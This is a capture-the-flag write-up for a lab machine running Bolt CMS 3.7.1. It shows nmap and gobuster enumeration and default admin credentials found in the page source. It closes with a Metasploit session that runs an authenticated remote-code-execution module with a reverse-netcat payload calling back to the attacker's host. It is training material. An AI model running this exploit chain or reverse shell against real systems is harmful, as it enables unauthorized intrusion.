---
title: Bolt
description: Bolt
---

Difficulty: Easy

![image.png](../../../assets/Bolt/image.png)

## Information Gathering Phase

### Nmap

```python
┌──(khem㉿kali)-[~]
└─$ nmap -sCV -A -vv 10.10.87.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 00:46 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
Initiating Ping Scan at 00:46
Scanning 10.10.87.202 [2 ports]
Completed Ping Scan at 00:46, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:46
Completed Parallel DNS resolution of 1 host. at 00:46, 0.09s elapsed
Initiating Connect Scan at 00:46
Scanning 10.10.87.202 [1000 ports]
Discovered open port 22/tcp on 10.10.87.202
Discovered open port 80/tcp on 10.10.87.202
Discovered open port 8000/tcp on 10.10.87.202
Completed Connect Scan at 00:47, 22.01s elapsed (1000 total ports)
Initiating Service scan at 00:47
Scanning 3 services on 10.10.87.202
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \}\nh1 \{ font-size: 1\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \}\nh1, p \{ padding-left: 10px; \}\ncode\.url \{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #ffffff; color: #000000; \}\nh1 \{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\}\n</style>'
Completed Service scan at 00:47, 28.26s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.87.202.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 8.91s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 1.19s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Nmap scan report for 10.10.87.202
Host is up, received syn-ack (0.26s latency).
Scanned at 2024-12-10 00:46:53 EST for 60s
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaKxKph/4I3YG+2GjzPjOevcQldxrIll8wZ8SZyy2fMg3S5tl5G6PBFbF9GvlLt1X/gadOlBc99EG3hGxvAyoujfdSuXfxVznPcVuy0acAahC0ohdGp3fZaPGJMl7lW0wkPTHO19DtSsVPniBFdrWEq9vfSODxqdot8ij2PnEWfnCsj2Vf8hI8TRUBcPcQK12IsAbvBOcXOEZoxof/IQU/rSeiuYCvtQaJh+gmL7xTfDmX1Uh2+oK6yfCn87RpN2kDp3YpEHVRJ4NFNPe8lgQzekGCq0GUZxjUfFg1JNSWe1DdvnaWnz8J8dTbVZiyNG3NAVAwP1+iFARVOkiH1hi1
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE52sV7veXSHXpLFmu5lrkk8HhYX2kgEtphT3g7qc1tfqX4O6gk5IlBUH25VUUHOhB5BaujcoBeId/pMh4JLpCs=
|   256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZwq5mZftBwFP7wDFt5kinK8mM+Gk2MaPebZ4I0ukZ+
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8000/tcp open  http    syn-ack (PHP 7.2.32-1)
|_http-title: Bolt | A hero is unleashed
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Tue, 10 Dec 2024 05:50:34 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Tue, 10 Dec 2024 05:50:34 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 819e01
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Tue, 10 Dec 2024 05:50:33 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Tue, 10 Dec 2024 05:50:33 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: c84cd7
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/10%Time=6757D5F0%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Tue,\x2010\x20Dec
SF:\x202024\x2005:50:33\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x2
SF:0PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x
SF:20public,\x20s-maxage=600\r\nDate:\x20Tue,\x2010\x20Dec\x202024\x2005:5
SF:0:33\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-
SF:Token:\x20c84cd7\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\
SF:x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset
SF:=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\
SF:x20A\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<link\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Ro
SF:boto:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.
SF:css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styl
SF:esheet\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20
SF:\x20\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x2
SF:0\x20\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/
SF:\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HT
SF:TP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue,\x2010\x20Dec\x202024\x2
SF:005:50:34\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.
SF:32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\
SF:x20must-revalidate\r\nDate:\x20Tue,\x2010\x20Dec\x202024\x2005:50:34\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-c
SF:ache\r\nexpires:\x20-1\r\nX-Debug-Token:\x20819e01\r\n\r\n<!doctype\x20
SF:html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20ini
SF:tial-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googlea
SF:pis\.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\
SF:">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/
SF:theme\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\
SF:"\x20content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class
SF:=\"vis");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.06 seconds
```

this scan is longer than I expected. Anyway we can see 2 ports running http and ssh on port 22

### Web Enumeration

![image.png](../../../assets/Bolt/image%201.png)

this is the website for port 8000

![image.png](../../../assets/Bolt/image%202.png)

![image.png](../../../assets/Bolt/image%203.png)

The username is bolt and it password is boltadmin123, which I found it on source code.

lets find login page to login

```python
──(khem㉿kali)-[~]
└─$ gobuster dir -w common.txt -u http://10.10.87.202:8000/bolt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.87.202:8000/bolt
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 302) [Size: 288] [--> /bolt/login]
Progress: 594 / 4731 (12.56%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 595 / 4731 (12.58%)[ERROR] Get "http://10.10.87.202:8000/bolt/adverts": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.87.202:8000/bolt/advice": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 597 / 4731 (12.62%)[ERROR] Get "http://10.10.87.202:8000/bolt/adview": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 604 / 4731 (12.77%)[ERROR] Get "http://10.10.87.202:8000/bolt/affiliate_terms": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 605 / 4731 (12.79%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 607 / 4731 (12.83%)[ERROR] Get "http://10.10.87.202:8000/bolt/africa": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/changelog            (Status: 302) [Size: 288] [--> /bolt/login]
/checks               (Status: 302) [Size: 288] [--> /bolt/login]
Progress: 1409 / 4731 (29.78%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
Progress: 1410 / 4731 (29.80%)[ERROR] Get "http://10.10.87.202:8000/bolt/dclk": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1417 / 4731 (29.95%)[ERROR] Get "http://10.10.87.202:8000/bolt/deals": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/extensions           (Status: 302) [Size: 288] [--> /bolt/login]
/files                (Status: 302) [Size: 288] [--> /bolt/login]
/login                (Status: 200) [Size: 6909]
/logout               (Status: 302) [Size: 288] [--> /bolt/login]
Progress: 3276 / 4731 (69.25%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/profile              (Status: 302) [Size: 288] [--> /bolt/login]
/roles                (Status: 302) [Size: 288] [--> /bolt/login]
Progress: 4122 / 4731 (87.13%)[ERROR] Get "http://10.10.87.202:8000/bolt/tele": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/tr                   (Status: 302) [Size: 288] [--> /bolt/login]
/upload               (Status: 302) [Size: 288] [--> /bolt/login]
/users                (Status: 302) [Size: 288] [--> /bolt/login]
Progress: 4730 / 4731 (99.98%)
===============================================================
Finished
===============================================================
```

found login endpoint

![image.png](../../../assets/Bolt/image%204.png)

![image.png](../../../assets/Bolt/image%205.png)

we got the version for bolt which is “Bolt 3.7.1”

## Privilege Escalation

![image.png](../../../assets/Bolt/image%206.png)

and this the is exploit for Bolt 3.7.1

![image.png](../../../assets/Bolt/image%207.png)

```python
msf6 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1    \_ target: Linux (x86)                    .                .          .      .
   2    \_ target: Linux (x64)                    .                .          .      .
   3    \_ target: Linux (cmd)                    .                .          .      .
   4  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
msf6 > use 0
[*] Using configured payload cmd/unix/reverse_netcat

msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.125.165
rhosts => 10.10.125.165
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
username => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
password => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.17.7.239
lhost => 10.17.7.239
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
```

![image.png](../../../assets/Bolt/image%208.png)

![image.png](../../../assets/Bolt/image%209.png)

### Final Thought

This room focus more on the use of metasploit, which is good for practice. So I would like to recommend this room to beginner as a intro to metasploit.